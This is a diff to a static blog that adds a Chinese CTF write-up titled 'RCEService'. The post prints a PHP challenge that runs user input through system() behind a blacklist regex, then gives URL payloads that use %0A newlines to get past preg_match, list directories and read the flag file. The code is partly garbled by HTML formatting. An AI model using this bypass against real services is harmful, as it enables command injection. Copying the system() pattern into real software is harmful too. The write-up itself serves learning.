@@ -161,6 +161,77 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://octopus-brooo.github.io/2021/08/01/RCEService/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.png">
+      <meta itemprop="name" content="octopus">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Octopus's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/08/01/RCEService/" class="post-title-link" itemprop="url">RCEService</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-08-01 15:12:47 / 修改时间：15:20:50" itemprop="dateCreated datePublished" datetime="2021-08-01T15:12:47+08:00">2021-08-01</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>源码：</p>
+<p><code>&lt;?php</code></p>
+<p><code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code></p>
+<p><code>if (isset($_REQUEST[&#39;cmd&#39;])) &#123;   $json = $_REQUEST[&#39;cmd&#39;];</code></p>
+<p>  <code>if (!is_string($json)) &#123;</code><br>    <code>echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;</code><br>  <code>&#125; elseif (preg_match(&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-</code>|~\x7F]+).*$/‘, $json)) {<code>     </code>echo ‘Hacking attempt detected<br/><br/>‘;<code>   </code>} else {<code>     </code>echo ‘Attempting to run command:<br/>‘;<code>     </code>$cmd = json_decode($json, true)[‘cmd’];<code>     </code>if ($cmd !== NULL) {<code>       </code>system($cmd);<code>     </code>} else {<code>       </code>echo ‘Invalid input’;<code>     </code>}<code>     </code>echo ‘<br/><br/>‘;<code>   </code>}<code> </code>}`</p>
+<p><code>?&gt;</code></p>
+<p>用的是preg_match()函数，只匹配一行，用个换行符搞定payload</p>
+<p><code>?cmd=&#123;%0A&quot;cmd&quot;: &quot;ls /&quot;%0A&#125;</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20200509155112586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><code>?cmd=&#123;%0A&quot;cmd&quot;: &quot;ls /home/rceservice&quot;%0A&#125;</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20200509155312253.png" alt="在这里插入图片描述"></p>
+<p><code>?cmd=&#123;%0A&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;%0A&#125;</code></p>
+<p><img src="C:\Users\86188\Desktop\QQ截图20210801152034.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://octopus-brooo.github.io/2021/07/31/KooKie/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -554,7 +625,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">6</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
